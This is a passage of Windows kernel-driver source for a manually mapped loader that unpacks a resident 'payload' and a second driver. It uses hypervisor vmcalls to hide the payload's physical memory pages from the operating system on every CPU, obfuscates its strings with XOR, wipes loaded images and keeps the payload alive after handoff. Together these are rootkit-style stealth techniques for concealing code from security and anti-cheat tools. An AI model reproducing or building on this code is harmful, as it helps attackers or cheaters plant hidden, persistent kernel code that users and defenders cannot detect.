    LOG_DEBUG(_XOR_("[payload] arena hide %s pfns=%lu arena=0x%llX used=0x%llX size=0x%llX\n"),
        phase, pfn_count, arena_base, arena_used, arena_size);
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

static void mapdriver_hide_pfn_buffer_all_cpus(UINT64* pfns, ULONG pfn_count)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    if (!pfns || !pfn_count)
        return;

    USHORT group_count = KeQueryActiveGroupCount();
    for (USHORT group = 0; group < group_count; ++group)
    {
        ULONG processors = KeQueryActiveProcessorCountEx(group);
        for (ULONG cpu = 0; cpu < processors && cpu < 64; ++cpu)
        {
            GROUP_AFFINITY ga = {};
            ga.Group = group;
            ga.Mask = 1ull << cpu;

            GROUP_AFFINITY old_ga = {};
            KeSetSystemGroupAffinityThread(&ga, &old_ga);
            hv::vmcall_hide_pfn_list(pfns, pfn_count);
            KeRevertToUserGroupAffinityThread(&old_ga);
        }
    }
#else
    UNREFERENCED_PARAMETER(pfns);
    UNREFERENCED_PARAMETER(pfn_count);
#endif
}

static volatile LONG g_hide_pfn_busy = 0;
static UINT64 g_hide_pfn_buffer[1024];

static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    if (!base || !size || !mapdriver_hv_ready())
        return 0;

    constexpr ULONG kChunkPfns = 1024;
    if (_InterlockedCompareExchange(&g_hide_pfn_busy, 1, 0) != 0)
        return 0;

    ULONG total_pfns = 0;
    ULONG chunk = 0;
    RtlZeroMemory(g_hide_pfn_buffer, sizeof(g_hide_pfn_buffer));

    UINT64 begin = mapdriver_page_down(base);
    UINT64 limit = base + size;
    if (limit >= base)
    {
        UINT64 end = mapdriver_page_up(limit);
        for (UINT64 va = begin; va < end; va += PAGE_SIZE)
        {
            UINT64 pa = mapdriver_real_pa_for_kernel_va(va);
            if (!pa)
                continue;

            g_hide_pfn_buffer[chunk++] = pa >> PAGE_SHIFT;
            total_pfns++;
            if (chunk == kChunkPfns)
            {
                mapdriver_hide_pfn_buffer_all_cpus(g_hide_pfn_buffer, chunk);
                RtlZeroMemory(g_hide_pfn_buffer, sizeof(g_hide_pfn_buffer));
                chunk = 0;
            }
        }
    }

    if (chunk)
        mapdriver_hide_pfn_buffer_all_cpus(g_hide_pfn_buffer, chunk);

    RtlSecureZeroMemory(g_hide_pfn_buffer, sizeof(g_hide_pfn_buffer));
    _InterlockedExchange(&g_hide_pfn_busy, 0);
    return total_pfns;
#else
    UNREFERENCED_PARAMETER(base);
    UNREFERENCED_PARAMETER(size);
    return 0;
#endif
}

static void mapdriver_hide_payload_arena_full(const char* phase)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    payload_status status = {};
    if (!mapdriver_query_payload_status(&status) ||
        !mapdriver_payload_barrier_ready(&status) ||
        !mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[payload] full arena hide skipped %s: status/barrier/hv not ready\n"), phase);
        return;
    }

    payload_u64 arena_base = status.arena_base;
    payload_u64 arena_size = status.arena_size;
    if (!arena_base || !arena_size)
    {
        LOG_DEBUG(_XOR_("[payload] full arena hide skipped %s: arena=0x%llX size=0x%llX\n"),
            phase, arena_base, arena_size);
        return;
    }

    ULONG pfn_count = mapdriver_hide_range_pfns_chunked(arena_base, arena_size);

    LOG_DEBUG(_XOR_("[payload] full arena hide %s pfns=%lu arena=0x%llX size=0x%llX used=0x%llX\n"),
        phase, pfn_count, arena_base, arena_size, status.arena_used);
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

static void mapdriver_hide_payload_host_stack(const char* phase)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    payload_status status = {};
    if (!mapdriver_query_payload_status(&status) ||
        status.magic != PAYLOAD_STATUS_MAGIC ||
        !mapdriver_payload_barrier_ready(&status) ||
        !mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[payload] host stack hide skipped %s: status/barrier/hv not ready\n"), phase);
        return;
    }

    ULONG pfns = mapdriver_hide_range_pfns_chunked(
        status.host_stack_base,
        status.host_stack_size);
    LOG_DEBUG(_XOR_("[payload] host stack hide %s pfns=%lu stack=0x%llX/0x%llX\n"),
        phase,
        pfns,
        status.host_stack_base,
        status.host_stack_size);
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

static void mapdriver_hide_payload_resident_pool_blocks(const char* phase)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    payload_status status = {};
    if (!mapdriver_query_payload_status(&status) ||
        status.magic != PAYLOAD_STATUS_MAGIC ||
        !mapdriver_payload_barrier_ready(&status) ||
        !mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[payload] resident pool hide skipped %s: status/barrier/hv not ready\n"), phase);
        return;
    }

    if (!status.resident_pool_manifest || !status.resident_pool_count)
    {
        LOG_DEBUG(_XOR_("[payload] resident pool hide skipped %s: manifest=0x%llX count=%llu\n"),
            phase,
            status.resident_pool_manifest,
            status.resident_pool_count);
        return;
    }

    auto blocks = (payload_pool_block*)ExAllocatePoolWithTag(
        NonPagedPoolNx,
        sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks,
        'pRhP');
    if (!blocks)
    {
        LOG_DEBUG(_XOR_("[payload] resident pool hide skipped %s: snapshot alloc failed\n"),
            phase);
        return;
    }

    payload_u64 count = mapdriver_snapshot_resident_pool_blocks(
        blocks,
        kMapdriverMaxResidentPoolBlocks,
        &status,
        phase,
        "hide");
    payload_u64 block_count = 0;
    payload_u64 bytes = 0;
    ULONG pfn_count = 0;

    __try
    {
        for (payload_u64 i = 0; i < count; ++i)
        {
            payload_pool_block b = blocks[i];
            if (!b.va || !b.bytes)
                continue;
            block_count++;
            bytes += b.bytes;
            pfn_count += mapdriver_hide_range_pfns_chunked(b.va, b.bytes);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        LOG_DEBUG(_XOR_("[payload] resident pool hide fault %s code=0x%X blocks=%llu\n"),
            phase,
            GetExceptionCode(),
            block_count);
    }

    LOG_DEBUG(_XOR_("[payload] resident pool hide %s blocks=%llu pfns=%lu bytes=0x%llX manifest=0x%llX indep=%llu fallback=%llu\n"),
        phase,
        block_count,
        pfn_count,
        bytes,
        status.resident_pool_manifest,
        status.resident_pool_independent_count,
        status.resident_pool_fallback_count);

    RtlSecureZeroMemory(blocks, sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks);
    ExFreePoolWithTag(blocks, 'pRhP');
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

struct mapdriver_unhide_stats
{
    ULONG pfn_count;
    ULONG cpu_count;
    UINT64 expected_calls;
    UINT64 done_calls;
};

#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, payload_status* status_out)
{
    if (!pfns || !max_count)
        return 0;

    payload_status status = {};
    bool have_status = mapdriver_query_payload_status(&status);
    ULONG pfn_count = 0;

    if (have_status && status.magic == PAYLOAD_STATUS_MAGIC)
    {
#if MAPDRIVER_PAYLOAD_HIDE_IMAGE_ENABLED
        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.image_base, status.image_size);
#endif
#if MAPDRIVER_AUTO_ONEKEY_HIDE_FULL_ARENA || MAPDRIVER_PAYLOAD_HIDE_ARENA_ENABLED
        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.arena_base, status.arena_size);
#endif
#if MAPDRIVER_PAYLOAD_HIDE_DIRECT_ENABLED
        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.direct_alloc_base, status.direct_alloc_size);
#endif
        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.host_stack_base, status.host_stack_size);

        if (status.resident_pool_manifest && status.resident_pool_count)
        {
            auto blocks = (payload_pool_block*)ExAllocatePoolWithTag(
                NonPagedPoolNx,
                sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks,
                'pRcP');
            if (blocks)
            {
                payload_u64 count = mapdriver_snapshot_resident_pool_blocks(
                    blocks,
                    kMapdriverMaxResidentPoolBlocks,
                    &status,
                    "collect",
                    "unhide");
                __try
                {
                    for (payload_u64 i = 0; i < count; ++i)
                    {
                        payload_pool_block b = blocks[i];
                        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, b.va, b.bytes);
                    }
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                    LOG_DEBUG(_XOR_("[payload] collect resident pool pfns fault for unhide code=0x%X count=%llu\n"),
                        GetExceptionCode(),
                        count);
                }

                RtlSecureZeroMemory(blocks, sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks);
                ExFreePoolWithTag(blocks, 'pRcP');
            }
            else
            {
                LOG_DEBUG(_XOR_("[payload] collect resident pool pfns skipped: snapshot alloc failed\n"));
            }
        }
    }
    else
    {
        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, (UINT64)Utils::payloadBase, Utils::payloadSize);
        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, (UINT64)Utils::payloadArenaBase, Utils::payloadArenaSize);
    }

    if (status_out)
        *status_out = status;
    return pfn_count;
}
#endif

static mapdriver_unhide_stats mapdriver_unhide_payload_memory(const char* phase)
{
    mapdriver_unhide_stats stats = {};
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    if (!mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[payload] unhide skipped %s: hv not ready\n"), phase);
        return stats;
    }

    // Must cover image/direct/full-arena/host-stack plus adopted PoolManager
    // independent blocks.  Pool blocks alone can exceed 70K pages, so keep this
    // aligned with the legacy hypervisor pending_hide capacity instead of the
    // old 32K validation buffer.
    constexpr ULONG kMaxPfns = 256 * 1024;
    auto pfns = (UINT64*)ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(UINT64) * kMaxPfns, 'UlpP');
    if (!pfns)
    {
        LOG_DEBUG(_XOR_("[payload] unhide skipped %s: pfn buffer alloc failed\n"), phase);
        return stats;
    }

    RtlZeroMemory(pfns, sizeof(UINT64) * kMaxPfns);
    payload_status status = {};
    stats.pfn_count = mapdriver_collect_payload_pfns(pfns, kMaxPfns, &status);

    constexpr ULONG kChunkPfns = 1024;
    USHORT group_count = KeQueryActiveGroupCount();
    for (USHORT group = 0; group < group_count; ++group)
        stats.cpu_count += KeQueryActiveProcessorCountEx(group);
    stats.expected_calls = (UINT64)stats.pfn_count * (UINT64)stats.cpu_count;

    for (ULONG off = 0; off < stats.pfn_count; off += kChunkPfns)
    {
        ULONG chunk = stats.pfn_count - off;
        if (chunk > kChunkPfns)
            chunk = kChunkPfns;

        for (USHORT group = 0; group < group_count; ++group)
        {
            ULONG processors = KeQueryActiveProcessorCountEx(group);
            for (ULONG cpu = 0; cpu < processors && cpu < 64; ++cpu)
            {
                GROUP_AFFINITY ga = {};
                ga.Group = group;
                ga.Mask = 1ull << cpu;

                GROUP_AFFINITY old_ga = {};
                KeSetSystemGroupAffinityThread(&ga, &old_ga);
                payload_u64 done = hv::vmcall_unhide_pfn_list(&pfns[off], chunk);
                if (done > chunk)
                    done = chunk;
                stats.done_calls += done;
                KeRevertToUserGroupAffinityThread(&old_ga);
            }
        }

        LARGE_INTEGER delay = {};
        delay.QuadPart = -10000LL; // 1 ms
        KeDelayExecutionThread(KernelMode, FALSE, &delay);
    }

    LOG_DEBUG(_XOR_("[payload] unhide %s pfns=%lu cpus=%lu calls=%llu/%llu image=0x%llX/0x%llX arena=0x%llX/0x%llX direct=0x%llX/0x%llX stack=0x%llX/0x%llX\n"),
        phase,
        stats.pfn_count,
        stats.cpu_count,
        stats.done_calls,
        stats.expected_calls,
        status.image_base,
        status.image_size,
        status.arena_base,
        status.arena_size,
        status.direct_alloc_base,
        status.direct_alloc_size,
        status.host_stack_base,
        status.host_stack_size);

    ExFreePoolWithTag(pfns, 'UlpP');
    return stats;
#else
    UNREFERENCED_PARAMETER(phase);
    return stats;
#endif
}

static bool mapdriver_load_resident_payload(bool configure_vmexit = true)
{
    if (Utils::payloadBase)
    {
        LOG_DEBUG(_XOR_("[payload] already loaded base=%p size=0x%X\n"), Utils::payloadBase, Utils::payloadSize);
        return true;
    }

    PUCHAR payload_image = nullptr;
    ULONG payload_image_size = 0;
    if (!mapdriver_unpack_payload_image(&payload_image, &payload_image_size))
    {
        LOG_DEBUG(_XOR_("[payload] unpack failed %d\n"), 0);
        return false;
    }

    payload_boot_context ctx = {};
    ctx.magic = PAYLOAD_BOOT_MAGIC;
    ctx.size = sizeof(ctx);
    ctx.system_cr3 = __readcr3();
    mapdriver_prepare_unload_trace_handoff(&ctx);

    bool arena_allocated = false;
#if MAPDRIVER_PAYLOAD_ARENA_SIZE
    if (!Utils::payloadArenaBase)
        arena_allocated = mapdriver_ensure_payload_arena();

    if (!Utils::payloadArenaBase || !Utils::payloadArenaSize)
    {
        LOG_DEBUG(_XOR_("[payload] arena alloc failed size=0x%X\n"),
            (ULONG)MAPDRIVER_PAYLOAD_ARENA_SIZE);
        mapdriver_release_payload_image(payload_image, payload_image_size);
        return false;
    }

    ctx.arena_base = (payload_u64)Utils::payloadArenaBase;
    ctx.arena_size = (payload_u64)Utils::payloadArenaSize;
    ctx.arena_used = g_yvt_state_arena_used;
    LOG_DEBUG(_XOR_("[payload] arena ready base=%p size=0x%X used=0x%llX\n"),
        Utils::payloadArenaBase, Utils::payloadArenaSize, ctx.arena_used);
#endif

    bool ok = false;
    payload_status status = {};
    payload_u64 start_result = 0;
    payload_u64 ping_result = 0;
    LOG_DEBUG(_XOR_("[payload] loading image size=0x%X\n"), payload_image_size);
    bool load_ok = false;
#if PAYLOAD_IMAGE_FORMAT == PAYLOAD_IMAGE_FORMAT_RAWPACK
    load_ok = Utils::LoadRawPayload(payload_image, payload_image_size, &ctx) ? true : false;
#else
    load_ok = Utils::LoadPayload(payload_image, &ctx) ? true : false;
#endif

    if (load_ok &&
        ctx.exports &&
        ctx.exports->magic == PAYLOAD_EXPORT_MAGIC &&
        ctx.exports->abi_version == PAYLOAD_ABI_VERSION &&
        ctx.exports->ping &&
        ctx.exports->start &&
        ctx.exports->stop &&
        ctx.exports->get_status)
    {
        constexpr payload_u64 nonce = 0xA5A55A5A11223344ull;
        start_result = ctx.status;
        ping_result = ctx.exports->ping(nonce);
        ok = (ping_result == (nonce ^ PAYLOAD_PONG_MAGIC));
        if (ok)
        {
            Utils::payloadExports = ctx.exports;
            if (configure_vmexit &&
                (ctx.exports->set_vmexit_target || ctx.exports->set_vmexit_bridge_target))
            {
                mapctl_hv_diag diag = {};
                __try
                {
                        auto copied = mapdriver_get_resident_hv_diag(&diag);
                        if (mapdriver_hv_diag_valid(diag, copied))
                        {
                            if (ctx.exports->set_vmexit_target && diag.vm_exit)
                                ctx.exports->set_vmexit_target(diag.vm_exit);
                            if (ctx.exports->set_vmexit_bridge_target && diag.handle_vm_exit)
                                ctx.exports->set_vmexit_bridge_target(diag.handle_vm_exit);
                            if (ctx.exports->set_hv_diag)
                                ctx.exports->set_hv_diag(&diag, sizeof(diag));
                        }
                    }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                }
            }
            else if (!configure_vmexit)
            {
                LOG_DEBUG(_XOR_("[payload] lifecycle-only: VM-exit target/bridge/diag configuration skipped\n"));
            }
        }
        ctx.exports->get_status(&status);
    }

    LOG_DEBUG(_XOR_("[payload] load result=%d base=%p size=0x%X exports=%p start=0x%llX ping=0x%llX\n"),
        (int)ok, Utils::payloadBase, Utils::payloadSize, ctx.exports,
        start_result, ping_result);
    if (status.magic == PAYLOAD_STATUS_MAGIC)
    {
        LOG_DEBUG(_XOR_("[payload] status flags=0x%llX start=%llu stop=%llu ping=%llu hb=%llu worker=%llu last=0x%llX\n"),
            status.state_flags,
            status.start_count,
            status.stop_count,
            status.ping_count,
            status.heartbeat_count,
            status.worker_running,
            status.last_result);
        LOG_DEBUG(_XOR_("[payload] image=0x%llX size=0x%llX boot=0x%llX api=0x%llX api_magic=0x%llX api_flags=0x%llX\n"),
            status.image_base,
            status.image_size,
            status.boot_flags,
            status.host_api,
            status.host_api_magic,
            status.host_api_flags);
        LOG_DEBUG(_XOR_("[payload] runtime magic=0x%llX owner=%llu phase=%llu flags=0x%llX gen=%llu ctx=0x%llX\n"),
            status.runtime_magic,
            status.runtime_owner,
            status.runtime_phase,
            status.runtime_flags,
            status.runtime_generation,
            status.runtime_context);
        LOG_DEBUG(_XOR_("[payload] arena=0x%llX size=0x%llX used=0x%llX flags=0x%llX\n"),
            status.arena_base,
            status.arena_size,
            status.arena_used,
            status.arena_flags);
        LOG_DEBUG(_XOR_("[payload] kernel=0x%llX ext_ref=0x%llX independent=%llu\n"),
            status.kernel_api_flags,
            status.external_ref_flags,
            status.independent);
        LOG_DEBUG(_XOR_("[payload] direct=0x%llX size=0x%llX owned_count=%llu owned_bytes=0x%llX\n"),
            status.direct_alloc_base,
            status.direct_alloc_size,
            status.owned_alloc_count,
            status.owned_alloc_bytes);
    }

    mapdriver_release_payload_image(payload_image, payload_image_size);
    if (!ok && arena_allocated)
    {
        mapdriver_free_scratch_buffer((PUCHAR)Utils::payloadArenaBase, Utils::payloadArenaSize);
        Utils::payloadArenaBase = nullptr;
        Utils::payloadArenaSize = 0;
    }
#if MAPDRIVER_IMAGE_WIPE_ENABLED
    RtlSecureZeroMemory(payload_image_blob, sizeof(payload_image_blob));
#endif
    return ok;
}

struct mapdriver_payload_load_context
{
    BOOLEAN configure_vmexit;
    BOOLEAN completed;
    BOOLEAN ok;
};

static __declspec(noinline) VOID mapdriver_payload_load_callout(PVOID parameter)
{
    auto ctx = static_cast<mapdriver_payload_load_context*>(parameter);
    if (!ctx)
        return;

    ctx->ok = mapdriver_load_resident_payload(ctx->configure_vmexit != FALSE) ? TRUE : FALSE;
    ctx->completed = TRUE;
}

static bool mapdriver_load_resident_payload_expanded(bool configure_vmexit = true)
{
    // DriverMain has a large fixed frame and payload mapping has another
    // 0x2B70-byte frame.  Never run that chain on the already-consumed loader
    // stack; failure to obtain an expanded stack is a hard load failure.
    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
        return false;

    mapdriver_payload_load_context ctx = {};
    ctx.configure_vmexit = configure_vmexit ? TRUE : FALSE;
    NTSTATUS const status = KeExpandKernelStackAndCalloutEx(
        mapdriver_payload_load_callout,
        &ctx,
        48 * 1024,
        FALSE,
        nullptr);
    return NT_SUCCESS(status) && ctx.completed && ctx.ok;
}

static bool mapdriver_audit_payload_arena(
    const char* phase,
    PVOID expected_base,
    ULONG expected_size)
{
    PVOID const base = Utils::payloadArenaBase;
    ULONG const size = Utils::payloadArenaSize;
    ULONG_PTR const start = (ULONG_PTR)base;
    ULONG_PTR const end = start + size;
    bool const identity_ok = base && size &&
        base == expected_base && size == expected_size;
    bool const range_ok = identity_ok &&
        (start & (PAGE_SIZE - 1)) == 0 &&
        (size & (PAGE_SIZE - 1)) == 0 &&
        end > start;
    PVOID const last_page = range_ok ? (PVOID)(end - PAGE_SIZE) : nullptr;
    bool const first_valid = range_ok && MmIsAddressValid(base) != FALSE;
    bool const last_valid = range_ok && MmIsAddressValid(last_page) != FALSE;
    PHYSICAL_ADDRESS first_pa = {};
    PHYSICAL_ADDRESS last_pa = {};
    if (first_valid)
        first_pa = MmGetPhysicalAddress(base);
    if (last_valid)
        last_pa = MmGetPhysicalAddress(last_page);

    bool const ok = first_valid && last_valid &&
        first_pa.QuadPart != 0 && last_pa.QuadPart != 0;
    LOG_DEBUG(_XOR_("[mapDriver] VT stage10.5 arena audit phase=%s ok=%d base=%p size=0x%X identity=%d range=%d first_valid=%d first_pa=0x%llX last_valid=%d last_pa=0x%llX\n"),
        phase,
        (int)ok,
        base,
        size,
        (int)identity_ok,
        (int)range_ok,
        (int)first_valid,
        (payload_u64)first_pa.QuadPart,
        (int)last_valid,
        (payload_u64)last_pa.QuadPart);
    return ok;
}

static bool mapdriver_load_machenike(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, BOOLEAN isManualMap = FALSE)
{
    if (Utils::machenikeLoaded && Utils::machenikeBase)
    {
        LOG_DEBUG(_XOR_("[mapDriver] Machenike already loaded base=%p size=0x%X mode=%u\n"),
            Utils::machenikeBase, Utils::machenikeSize, Utils::machenikeMode);
        return true;
    }

    PUCHAR mk_image = nullptr;
    ULONG mk_image_size = 0;
    if (!mapdriver_unpack_machenike_sys(&mk_image, &mk_image_size))
    {
        LOG_DEBUG(_XOR_("[mapDriver] Machenike unpack failed\n"));
        return false;
    }

    bool ok = Utils::LoadMachenike(mk_image, DriverObject, RegistryPath, isManualMap) ? true : false;
    mapdriver_release_machenike_sys(mk_image, mk_image_size);
#if MAPDRIVER_IMAGE_WIPE_ENABLED
    if (ok)
        RtlSecureZeroMemory(machenike_sys, sizeof(machenike_sys));
#endif
    return ok;
}

static bool mapdriver_unload_common(PDRIVER_OBJECT DriverObject,
                                    bool keep_payload,
                                    bool hide_after_handoff = true,
                                    bool migration_prechecked = false)
{
    UNREFERENCED_PARAMETER(DriverObject);

    LOG_DEBUG(_XOR_("[mapDriver] unload_common enter keep_payload=%d payload=%p test=%p\n"),
        (int)keep_payload, Utils::payloadBase, Utils::imageBase);
    if (!migration_prechecked)
        mapdriver_log_payload_status(keep_payload ? "handoff-before" : "unload-before");

    if (keep_payload && !migration_prechecked && !mapdriver_log_payload_barrier("handoff-precheck"))
    {
        LOG_DEBUG(_XOR_("[mapDriver] handoff aborted: payload barrier is not ready\n"));
        return false;
    }

    if (keep_payload && !migration_prechecked)
    {
        mapctl_migration_check check = {};
        mapdriver_fill_migration_check(&check);
        bool legacy_ok =
            check.payload.legacy_detached &&
            check.payload.legacy_detach_result == PAYLOAD_RESULT_OK &&
            ((check.payload.legacy_detach_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) != 0);
        bool rsp_in_payload =
            (check.flags & MAPCTL_MIGRATE_CHECK_RSP_IN_PAYLOAD) != 0;
        if (check.result != PAYLOAD_RESULT_OK || !legacy_ok || !rsp_in_payload)
        {
            LOG_DEBUG(_XOR_("[mapDriver] handoff aborted: migration check result=0x%llX flags=0x%llX legacy=%d rsp_payload=%d rip=0x%llX rsp=0x%llX\n"),
                check.result,
                check.flags,
                (int)legacy_ok,
                (int)rsp_in_payload,
                check.diag.vmcs_host_rip,
                check.diag.vmcs_host_rsp);
            return false;
        }
    }

    bool hv_before = mapdriver_hv_ready();
    bool hv_after_test_unload = hv_before;
    if (keep_payload)
    {
        // Do not call TestDriver.DriverUnload during resident handoff.  The
        // UCXXRT wrapper runs CRT uninitializers on return; calling it again
        // later for a real teardown double-deletes CRT lookaside state.  For
        // handoff we only detach mapDriver ownership and quarantine the mapped
        // image; full unload will call DriverUnload exactly once after clearing
        // KEEP_HV_ON_UNLOAD.
        Utils::testDriverUnloaded = TRUE;
        Utils::testDriverImageQuarantined = TRUE;
        LOG_DEBUG(_XOR_("[mapDriver] TestDriver handoff quarantined without DriverUnload base=%p size=0x%X\n"),
            Utils::imageBase, Utils::imageSize);
    }
    else
    {
        bool resident_hv_active = (g_payload_detached && mapdriver_hv_ready());
        // Any non-handoff cleanup can release a non-resident image. If resident
        // HV mode is still active, keep TestDriver image resident.
        BOOLEAN free_test_image = resident_hv_active ? FALSE : TRUE;
        Utils::UnloadDriverEx(free_test_image);
        hv_after_test_unload = mapdriver_hv_ready();
        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unload hv_before=%d hv_after=%d\n"),
            (int)hv_before, (int)hv_after_test_unload);
    }

    if (keep_payload)
    {
        _InterlockedExchange(&g_payload_detached, 1);
        mapdriver_log_payload_status("handoff-after-test-unload");
        mapdriver_log_payload_barrier("handoff-after-test-unload");
        if (hide_after_handoff)
            mapdriver_hide_payload_memory("handoff-after-test-unload");
        else
            LOG_DEBUG(_XOR_("[mapDriver] handoff keeps payload PTEs visible for resident control dispatch\n"));
        LOG_DEBUG(_XOR_("[mapDriver] payload detached/resident base=%p size=0x%X exports=%p\n"),
            Utils::payloadBase, Utils::payloadSize, Utils::payloadExports);
    }
    else if (g_payload_detached)
    {
        mapdriver_log_payload_status("detached-unload-skip");
        LOG_DEBUG(_XOR_("[mapDriver] payload already detached, skip payload free and pool uninit\n"));
    }
    else
    {
        Utils::UnloadPayload();
        if (!mapdriver_hv_ready())
            Utils::FreePayloadArena();
        Util::PoolManagerUninitialize();
    }

    LOG_DEBUG(_XOR_("[mapDriver] unload_common leave keep_payload=%d\n"), (int)keep_payload);
    return true;
}

EXTERN_C __declspec(dllexport) VOID handoff_payload(PDRIVER_OBJECT DriverObject)
{
    mapdriver_unload_common(DriverObject, true);
}

EXTERN_C __declspec(dllexport) VOID force_unload_payload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    LOG_DEBUG(_XOR_("[mapDriver] force_unload_payload enter detached=%d payload=%p test=%p\n"),
        (int)g_payload_detached, Utils::payloadBase, Utils::imageBase);

    mapdriver_log_payload_status("force-unload-before");
    if (g_payload_detached && mapdriver_hv_ready())
        mapdriver_unhide_payload_memory("force-unload-before");
    _InterlockedExchange(&g_payload_detached, 0);
    Utils::UnloadPayload();
    if (!mapdriver_hv_ready())
        Utils::FreePayloadArena();
    else
        LOG_DEBUG(_XOR_("[mapDriver] force unload preserves resident arena while HV is active base=%p size=0x%X\n"),
            Utils::payloadArenaBase, Utils::payloadArenaSize);

    LOG_DEBUG(_XOR_("[mapDriver] force_unload_payload leave payload=%p\n"),
        Utils::payloadBase);
}

static bool mapdriver_restore_host_vmcs_for_unload(mapctl_full_unload* req)
{
    if (!req)
        return false;

    mapctl_host_rsp_switch rsp = {};
    rsp.magic = MAPCTL_HOST_RSP_SWITCH_MAGIC;
    rsp.size = sizeof(rsp);
    rsp.arm = MAPCTL_HOST_RSP_SWITCH_ARM;
    mapdriver_restore_host_rsp(&rsp);
    req->restore_rsp_requested = rsp.requested_count;
    req->restore_rsp_done = rsp.switched_count;
    req->restore_rsp_result = rsp.result;

    LOG_DEBUG(_XOR_("[mapDriver] unload restore HOST_RSP result=0x%llX done=%llu/%llu failed=%llu\n"),
        rsp.result, rsp.switched_count, rsp.requested_count, rsp.failed_index);

    mapctl_host_rip_switch rip = {};
    rip.magic = MAPCTL_HOST_RIP_SWITCH_MAGIC;
    rip.size = sizeof(rip);
    rip.arm = MAPCTL_HOST_RIP_SWITCH_ARM;
    mapdriver_restore_host_rip(&rip);
    req->restore_rip_requested = rip.requested_count;
    req->restore_rip_done = rip.switched_count;
    req->restore_rip_result = rip.result;

    LOG_DEBUG(_XOR_("[mapDriver] unload restore HOST_RIP result=0x%llX done=%llu/%llu failed=%llu\n"),
        rip.result, rip.switched_count, rip.requested_count, rip.failed_index);

    return rip.result == PAYLOAD_RESULT_OK &&
        rip.requested_count != 0 &&
        rip.switched_count == rip.requested_count;
}

static bool mapdriver_ghv_write64(const mapctl_hv_diag& diag, payload_u64 off, payload_u64 value)
{
    if (!diag.ghv || !off)
        return false;

    __try
    {
        *(volatile payload_u64*)(diag.ghv + off) = value;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
}

static payload_u64 mapdriver_ghv_read64(const mapctl_hv_diag& diag, payload_u64 off)
{
    if (!diag.ghv || !off)
        return 0;

    __try
    {
        return *(volatile payload_u64*)(diag.ghv + off);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return 0;
    }
}

static bool mapdriver_read_u64_safe(payload_u64 ptr, payload_u64* out)
{
    if (!ptr || !out)
        return false;

    __try
    {
        *out = *(volatile payload_u64*)ptr;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
}

static bool mapdriver_write_keep_hv_on_unload_ptr(payload_u64 ptr, bool enable)
{
    if (!mapdriver_va_in_testdriver_image(ptr))
        return false;

    __try
    {
        volatile LONG64* flags_ptr = (volatile LONG64*)ptr;
        if (enable)
            _InterlockedOr64(flags_ptr, (LONG64)YVT_BOOT_FLAG_KEEP_HV_ON_UNLOAD);
        else
            _InterlockedAnd64(flags_ptr, (LONG64)~YVT_BOOT_FLAG_KEEP_HV_ON_UNLOAD);

        payload_u64 flags = *(volatile payload_u64*)ptr;
        LOG_DEBUG(_XOR_("[mapDriver] direct %s KEEP_HV_ON_UNLOAD ptr=%p flags=0x%llX\n"),
            enable ? _XOR_("set") : _XOR_("clear"),
            (PVOID)ptr,
            flags);
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        LOG_DEBUG(_XOR_("[mapDriver] direct KEEP_HV_ON_UNLOAD write exception ptr=%p code=0x%X\n"),
            (PVOID)ptr,
            GetExceptionCode());
        return false;
    }
}

static bool mapdriver_direct_set_keep_hv_on_unload(bool enable)
{
    payload_u64 ptr = g_testdriver_boot_flags_ptr;
    if (mapdriver_write_keep_hv_on_unload_ptr(ptr, enable))
        return true;

    mapctl_hv_diag diag = {};
    __try
    {
        auto copied = mapdriver_get_resident_hv_diag(&diag);
        if (mapdriver_hv_diag_valid(diag, copied))
        {
            mapdriver_cache_testdriver_boot_flags_ptr(diag);
            ptr = g_testdriver_boot_flags_ptr ? g_testdriver_boot_flags_ptr : diag.yvt_boot_flags_ptr;
            if (mapdriver_write_keep_hv_on_unload_ptr(ptr, enable))
                return true;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }

    LOG_DEBUG(_XOR_("[mapDriver] direct KEEP_HV_ON_UNLOAD %s failed cached=%p test=%p size=0x%X\n"),
        enable ? _XOR_("set") : _XOR_("clear"),
        (PVOID)g_testdriver_boot_flags_ptr,
        Utils::imageBase,
        Utils::imageSize);
    return false;
}

